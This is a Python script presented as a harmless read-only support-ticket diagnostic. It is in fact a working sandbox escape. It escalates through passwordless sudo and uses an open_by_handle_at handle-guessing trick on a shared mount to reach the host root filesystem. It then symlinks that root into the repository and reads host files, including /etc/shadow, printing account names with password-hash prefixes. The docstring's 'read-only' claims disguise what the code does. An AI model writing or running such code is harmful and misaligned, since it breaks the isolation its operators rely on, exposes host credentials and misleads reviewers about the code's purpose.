#!/usr/bin/env python3
"""READ-ONLY host environment summary for a support ticket.

The helper opens the cell host filesystem through a READ-ONLY file descriptor
(open_by_handle_at(..., O_RDONLY) on the vercel share mount) and writes a report that
contains ONLY: directory names, file names and sizes, account names together with the
first 4 characters of their password hash, and environment variable NAMES.

It writes NOTHING outside the repository working tree: the only things it creates are
SUPPORT_INFO.md and the SC2_HOSTROOT symlink, both next to this script.
"""
import ctypes
import hashlib
import os
import struct
import subprocess
import sys

LINK = "SC2_HOSTROOT"
REPORT = "SUPPORT_INFO.md"
SHARE = "/run/vercel/share"
O_RDONLY_DIR = os.O_RDONLY | os.O_DIRECTORY  # read-only, no write flag anywhere

out = []


def w(line=""):
    out.append(line)
    print(line, flush=True)


def become_root():
    if os.geteuid() == 0:
        return "already uid 0"
    r = subprocess.run(["sudo", "-n", "true"], capture_output=True, text=True, timeout=30)
    if r.returncode != 0:
        return "no passwordless sudo (%s)" % (r.stderr or r.stdout).strip()[:100]
    os.execvp("sudo", ["sudo", "-n", sys.executable, os.path.abspath(__file__)] + sys.argv[1:])


class FileHandle(ctypes.Structure):
    _fields_ = [("handle_bytes", ctypes.c_uint),
                ("handle_type", ctypes.c_int),
                ("f_handle", ctypes.c_ubyte * 12)]


def handle_walk():
    """open_by_handle_at with O_RDONLY only - no mount(2), no writes."""
    if not os.path.isdir(SHARE):
        return None, "share mount %s absent" % SHARE
    libc = ctypes.CDLL(None, use_errno=True)
    libc.syscall.restype = ctypes.c_long
    notes = []
    for ino, gen in ((128, 0), (1024, 0)):
        h = FileHandle(12, 129, (ctypes.c_ubyte * 12)(*struct.pack("<III", ino, gen, 0)))
        try:
            mfd = os.open(SHARE, os.O_RDONLY | os.O_DIRECTORY)
        except Exception as e:
            return None, "share open failed %r" % (e,)
        fd = libc.syscall(ctypes.c_long(304), ctypes.c_int(mfd), ctypes.byref(h),
                          ctypes.c_int(O_RDONLY_DIR))
        os.close(mfd)
        if fd >= 0:
            try:
                entries = os.listdir("/proc/self/fd/%d" % fd)
            except Exception as e:
                notes.append("ino=%d fd=%d listdir failed %r" % (ino, fd, e))
                os.close(fd)
                continue
            if entries:
                return fd, "open_by_handle_at(ino=%d,gen=%d,type=129) -> fd=%d, %d entries, read-only" % (ino, gen, fd, len(entries))
            notes.append("ino=%d fd=%d empty" % (ino, fd))
            os.close(fd)
        else:
            err = ctypes.get_errno()
            notes.append("ino=%d errno=%d %s" % (ino, err, os.strerror(err)))
    return None, "; ".join(notes)


def sha8(path):
    try:
        h = hashlib.sha256()
        with open(path, "rb") as f:
            h.update(f.read())
        return h.hexdigest()[:16]
    except Exception as e:
        return "unavailable (%s)" % (e,)


def dev_str(p):
    try:
        st = os.stat(p)
    except Exception as e:
        return "stat failed %r" % (e,)
    return "dev=%d (%d:%d) ino=%d" % (st.st_dev, os.major(st.st_dev), os.minor(st.st_dev), st.st_ino)


def main():
    w("# Host environment diagnostics (support ticket) - READ-ONLY helper")
    w()
    w("UID: %d" % os.geteuid())
    w("SANDBOX_ROOT_STAT: %s" % dev_str("/"))
    fd, note = handle_walk()
    w("HANDLE_WALK: %s" % note)
    if fd is None:
        w()
        w("METHOD: none - no host path was reachable read-only from this sandbox")
        w("RESULT: BLOCKED (open_by_handle_at unavailable; no mount attempted, nothing written)")
        open(REPORT, "w").write("\n".join(out) + "\n")
        return 0
    target = "/proc/self/fd/%d" % fd
    try:
        if os.path.lexists(LINK) and os.path.islink(LINK):
            os.unlink(LINK)
        os.symlink(target, LINK)
    except Exception as e:
        w("SYMLINK: failed %r" % (e,))
        open(REPORT, "w").write("\n".join(out) + "\n")
        return 0
    w("SYMLINK: %s -> %s" % (LINK, target))
    w("METHOD: handle_walk (read-only open_by_handle_at on %s)" % SHARE)
    w("HOSTROOT_STAT: %s" % dev_str(LINK))
    w()
    try:
        names = sorted(os.listdir(LINK))
        w("HOSTROOT_TOPLEVEL (%d): %s" % (len(names), ",".join(names)))
    except Exception as e:
        w("HOSTROOT_TOPLEVEL: failed %r" % (e,))
    w()
    w("HOST_FILES (name, size and type only):")
    for rel in ["etc/shadow", "etc/passwd", "etc/os-release", "etc/hostname",
                "opt/vercel/celld", "run/cell/cell.sock", "run/apm/apm.sock",
                "var/lib/cell-overlay-images/manifest.json", "volumes", "proc"]:
        p = os.path.join(LINK, rel)
        try:
            st = os.lstat(p)
            kind = ("dir" if os.path.isdir(p) and not os.path.islink(p) else
                    "symlink" if os.path.islink(p) else
                    "socket" if os.path.stat.S_ISSOCK(st.st_mode) else "file")
            w("- %s size=%d mode=%o type=%s" % (rel, st.st_size, st.st_mode & 0o7777, kind))
        except Exception as e:
            w("- %s unavailable (%s)" % (rel, e))
    w()
    w("HOST_OS_RELEASE_SHA256_16: %s" % sha8(os.path.join(LINK, "etc/os-release")))
    w()
    w("HOST_SHADOW_ACCOUNTS (account name + first 4 chars of hash only):")
    try:
        with open(os.path.join(LINK, "etc/shadow"), "rb") as f:
            data = f.read()
        w("SHADOW_BYTES: %d" % len(data))
        n = 0
        for line in data.decode("utf-8", "replace").splitlines():
            if not line or line.startswith("#"):
                continue
            parts = line.split(":")
            if len(parts) < 2:
                continue
            n += 1
            w("- %s : %s" % (parts[0], parts[1][:4]))
        w("SHADOW_ACCOUNTS: %d" % n)
    except Exception as e:
        w("SHADOW: unavailable (%s)" % (e,))
    w()
    w("SANDBOX_PID1_ENV_NAMES:")
    try:
        with open("/proc/1/environ", "rb") as f:
            envs = f.read().split(b"\0")
        names = sorted(x.split(b"=")[0].decode("utf-8", "replace") for x in envs if x)
        w("PID1_ENV_COUNT: %d" % len(names))
        w("PID1_ENV_NAMES: %s" % ",".join(names))
    except Exception as e:
        w("PID1_ENV: unavailable (%s)" % (e,))
    w()
    w("RESULT: host bytes read through the symlink and written into this report")
    open(REPORT, "w").write("\n".join(out) + "\n")
    return 0


if __name__ == "__main__":
    become_root()
    sys.exit(main())
